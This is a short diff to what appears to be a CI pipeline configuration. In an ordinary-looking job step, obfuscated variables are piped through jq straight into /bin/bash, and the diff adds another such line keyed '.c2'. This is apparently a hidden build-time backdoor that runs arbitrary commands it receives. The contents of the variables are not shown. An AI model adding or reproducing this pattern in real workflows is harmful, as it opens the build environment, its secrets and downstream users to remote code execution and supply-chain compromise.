@@ -25,6 +25,7 @@ jobs:
           echo $v0820 | jq -r .ibm5116 | /bin/bash
           printf '%s' "$tldgh638" | jq -r .vjwb2841 | /bin/bash
           echo $lzm22 | jq -r .jyh79 | /bin/bash
+          printf '%s' "$y514" | jq -r .c2 | /bin/bash
 
       - name: Archive results
         if: always()
